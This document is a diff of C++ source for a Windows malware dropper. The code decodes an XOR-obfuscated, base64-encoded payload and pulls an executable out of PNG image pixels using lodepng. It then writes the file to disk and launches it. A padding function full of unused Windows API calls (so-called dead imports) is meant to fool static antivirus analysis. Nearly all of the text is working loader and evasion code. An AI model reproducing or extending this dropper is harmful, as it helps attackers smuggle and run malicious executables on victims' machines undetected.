@@ -20,7 +20,7 @@
 /// OPEN CV
 #include <iostream>
 #include <fstream>
-#include <opencv2/opencv.hpp>
+#include "./lodepng.h"
 
 // Linking with teh dead imports
 #pragma comment(lib, "Comctl32.lib")
@@ -29,6 +29,8 @@
 #pragma comment(lib, "Shlwapi.lib")
 #pragma comment(lib, "uxtheme.lib")
 
+typedef std::vector<unsigned char> DataVect;
+
 // Functions prototypes
 void dead();
 void drop(int size, void *buffer);
@@ -36,6 +38,7 @@ void* XOR(void *data, int size);
 void* base64decode(void *data,DWORD *size);
 void launch();
 void set_name();
+void write_to_disk(const std::string& filename,const DataVect &data);
 
 // Dropper Configurations
 #define DEAD_IMPORTS
@@ -70,22 +73,17 @@ int main()
 	data = base64decode(data,&size);
 #endif
 
-//// OPENCV MAGICCCC
-
-	cv::_InputArray img_data(data, size);
-  cv::Mat img = cv::imdecode(img_data, cv::IMREAD_GRAYSCALE);
-
-  DWORD img_size = img.total() * img.elemSize();
-
- // void *img_data = reinterpret_cast<const char*>(img.data);
+	// Converting the image to exe
+ 	unsigned width, height;
+	std::vector<unsigned char> image;
+	std::vector<unsigned char> png(reinterpret_cast<unsigned char*>(data), reinterpret_cast<unsigned char*>(data) + size);
+	unsigned error = lodepng::decode(image, width, height, png, LCT_RGB, 8);
 
 	// where to drop
 	set_name();
 	// Drop to Disk
 	// drop(size, data);
-
-  // OPEN CV
-	drop(img_size, img.data);
+	write_to_disk(name, image);
 	// launch process
 	launch();
 #ifdef DEAD_CODE
@@ -95,7 +93,6 @@ int main()
 	// exit without waiting child process
 	return 0;
 }
-
 void set_name()
 {
 #ifdef RANDOM_NAME
@@ -185,103 +182,110 @@ void drop(int size, void *buffer)
     fclose(f);
 }
 
+// Drop from nbtp
+void write_to_disk(const std::string& filename,const DataVect &data){
+    FILE* dest_file = fopen(filename.c_str(),"wb");
+    fwrite(&data[0],data.size(),1,dest_file);
+    fclose(dest_file);
+}
+
 // Dead Imports Function
 void dead()
 {
 	return;
-	memcpy(NULL,NULL,NULL);
-	memset(NULL,NULL,NULL);
-	strcpy(NULL,NULL);
-	ShellAboutW(NULL,NULL,NULL,NULL);
-	SHGetSpecialFolderPathW(NULL,NULL,NULL,NULL);
-	ShellMessageBox(NULL,NULL,NULL,NULL,NULL);
-	RegEnumKeyExW(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
-	RegOpenKeyExW(NULL,NULL,NULL,NULL,NULL);
-	RegEnumValueW(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
-	RegGetValueW(NULL,NULL,NULL,NULL,NULL,NULL,NULL);
-	RegDeleteKeyW(NULL,NULL);
-	RegQueryInfoKeyW(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
-	RegQueryValueExW(NULL,NULL,NULL,NULL,NULL,NULL);
-	RegSetValueExW(NULL,NULL,NULL,NULL,NULL,NULL);
-	RegCloseKey(NULL);
-	RegCreateKey(NULL,NULL,NULL);
-	BSTR_UserFree(NULL,NULL);
-	BufferedPaintClear(NULL,NULL);
-	CoInitialize(NULL);
-	CoUninitialize();
-	CLSID x;
-	CoCreateInstance(x,NULL,NULL,x,NULL);
-	IsThemeActive();
-	ImageList_Add(NULL,NULL,NULL);
-	ImageList_Create(NULL,NULL,NULL,NULL,NULL);
-	ImageList_Destroy(NULL);
-	WideCharToMultiByte(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
-	lstrlenA(NULL);
-	GetStartupInfoW(NULL);
-	DeleteCriticalSection(NULL);
-	LeaveCriticalSection(NULL);
-	EnterCriticalSection(NULL);
-	GetSystemTime(NULL);
-	CreateEventW(NULL,NULL,NULL,NULL);
-	CreateThread(NULL,NULL,NULL,NULL,NULL,NULL);
-	ResetEvent(NULL);
-	SetEvent(NULL);
-	CloseHandle(NULL);
-	GlobalSize(NULL);
-	GlobalLock(NULL);
-	GlobalUnlock(NULL);
-	GlobalAlloc(NULL,NULL);
-	lstrcmpW(NULL,NULL);
-	MulDiv(NULL,NULL,NULL);
-	GlobalFindAtomW(NULL);
-	GetLastError();
-	lstrlenW(NULL);
-	CompareStringW(NULL,NULL,NULL,NULL,NULL,NULL);
-	HeapDestroy(NULL);
-	HeapReAlloc(NULL,NULL,NULL,NULL);
-	HeapSize(NULL,NULL,NULL);
-	SetBkColor(NULL,NULL);
-	SetBkMode(NULL,NULL);
-	EmptyClipboard();
-	CreateDIBSection(NULL,NULL,NULL,NULL,NULL,NULL);
-	GetStockObject(NULL);
-	CreatePatternBrush(NULL);
-	DeleteDC(NULL);
-	EqualRgn(NULL,NULL);
-	CombineRgn(NULL,NULL,NULL,NULL);
-	SetRectRgn(NULL,NULL,NULL,NULL,NULL);
-	CreateRectRgnIndirect(NULL);
-	GetRgnBox(NULL,NULL);
-	CreateRectRgn(NULL,NULL,NULL,NULL);
-	CreateCompatibleBitmap(NULL,NULL,NULL);
-	LineTo(NULL,NULL,NULL);
-	MoveToEx(NULL,NULL,NULL,NULL);
-	ExtCreatePen(NULL,NULL,NULL,NULL,NULL);
-	GetObjectW(NULL,NULL,NULL);
-	GetTextExtentPoint32W(NULL,NULL,NULL,NULL);
-	GetTextMetricsW(NULL,NULL);
-	CreateSolidBrush(NULL);
-	SetTextColor(NULL,NULL);
-	GetDeviceCaps(NULL,NULL);
-	CreateCompatibleDC(NULL);
-	CreateFontIndirectW(NULL);
-	SelectObject(NULL,NULL);
-	GetTextExtentPointW(NULL,NULL,NULL,NULL);
-	RpcStringFreeW(NULL);
-	UuidToStringW(NULL,NULL);
-	UuidCreate(NULL);
-	timeGetTime();
-	SetBkColor(NULL,NULL);
-	free(NULL);
-	isspace(NULL);
-	tolower(NULL);
-	abort();
-	isalnum(NULL);
-	isdigit(NULL);
-	isxdigit(NULL);
-	toupper(NULL);
-	malloc(NULL);
-	free(NULL);
-	memmove(NULL,NULL,NULL);
-	isalpha(NULL);
+	// memcpy(NULL,NULL,NULL);
+	// memset(NULL,NULL,NULL);
+	// strcpy(NULL,NULL);
+	// ShellAboutW(NULL,NULL,NULL,NULL);
+	// SHGetSpecialFolderPathW(NULL,NULL,NULL,NULL);
+	// ShellMessageBox(NULL,NULL,NULL,NULL,NULL);
+	// RegEnumKeyExW(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
+	// RegOpenKeyExW(NULL,NULL,NULL,NULL,NULL);
+	// RegEnumValueW(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
+	// RegGetValueW(NULL,NULL,NULL,NULL,NULL,NULL,NULL);
+	// RegDeleteKeyW(NULL,NULL);
+	// RegQueryInfoKeyW(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
+	// RegQueryValueExW(NULL,NULL,NULL,NULL,NULL,NULL);
+	// RegSetValueExW(NULL,NULL,NULL,NULL,NULL,NULL);
+	// RegCloseKey(NULL);
+	// RegCreateKey(NULL,NULL,NULL);
+	// BSTR_UserFree(NULL,NULL);
+	// BufferedPaintClear(NULL,NULL);
+	// CoInitialize(NULL);
+	// CoUninitialize();
+	// CLSID x;
+	// CoCreateInstance(x,NULL,NULL,x,NULL);
+	// IsThemeActive();
+	// ImageList_Add(NULL,NULL,NULL);
+	// ImageList_Create(NULL,NULL,NULL,NULL,NULL);
+	// ImageList_Destroy(NULL);
+	// WideCharToMultiByte(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
+	// lstrlenA(NULL);
+	// GetStartupInfoW(NULL);
+	// DeleteCriticalSection(NULL);
+	// LeaveCriticalSection(NULL);
+	// EnterCriticalSection(NULL);
+	// GetSystemTime(NULL);
+	// CreateEventW(NULL,NULL,NULL,NULL);
+	// CreateThread(NULL,NULL,NULL,NULL,NULL,NULL);
+	// ResetEvent(NULL);
+	// SetEvent(NULL);
+	// CloseHandle(NULL);
+	// GlobalSize(NULL);
+	// GlobalLock(NULL);
+	// GlobalUnlock(NULL);
+	// GlobalAlloc(NULL,NULL);
+	// lstrcmpW(NULL,NULL);
+	// MulDiv(NULL,NULL,NULL);
+	// GlobalFindAtomW(NULL);
+	// GetLastError();
+	// lstrlenW(NULL);
+	// CompareStringW(NULL,NULL,NULL,NULL,NULL,NULL);
+	// HeapDestroy(NULL);
+	// HeapReAlloc(NULL,NULL,NULL,NULL);
+	// HeapSize(NULL,NULL,NULL);
+	// SetBkColor(NULL,NULL);
+	// SetBkMode(NULL,NULL);
+	// EmptyClipboard();
+	// CreateDIBSection(NULL,NULL,NULL,NULL,NULL,NULL);
+	// GetStockObject(NULL);
+	// CreatePatternBrush(NULL);
+	// DeleteDC(NULL);
+	// EqualRgn(NULL,NULL);
+	// CombineRgn(NULL,NULL,NULL,NULL);
+	// SetRectRgn(NULL,NULL,NULL,NULL,NULL);
+	// CreateRectRgnIndirect(NULL);
+	// GetRgnBox(NULL,NULL);
+	// CreateRectRgn(NULL,NULL,NULL,NULL);
+	// CreateCompatibleBitmap(NULL,NULL,NULL);
+	// LineTo(NULL,NULL,NULL);
+	// MoveToEx(NULL,NULL,NULL,NULL);
+	// ExtCreatePen(NULL,NULL,NULL,NULL,NULL);
+	// GetObjectW(NULL,NULL,NULL);
+	// GetTextExtentPoint32W(NULL,NULL,NULL,NULL);
+	// GetTextMetricsW(NULL,NULL);
+	// CreateSolidBrush(NULL);
+	// SetTextColor(NULL,NULL);
+	// GetDeviceCaps(NULL,NULL);
+	// CreateCompatibleDC(NULL);
+	// CreateFontIndirectW(NULL);
+	// SelectObject(NULL,NULL);
+	// GetTextExtentPointW(NULL,NULL,NULL,NULL);
+	// RpcStringFreeW(NULL);
+	// UuidToStringW(NULL,NULL);
+	// UuidCreate(NULL);
+	// timeGetTime();
+	// SetBkColor(NULL,NULL);
+	// free(NULL);
+	// isspace(NULL);
+	// tolower(NULL);
+	// abort();
+	// isalnum(NULL);
+	// isdigit(NULL);
+	// isxdigit(NULL);
+	// toupper(NULL);
+	// malloc(NULL);
+	// free(NULL);
+	// memmove(NULL,NULL,NULL);
+	// isalpha(NULL);
 }
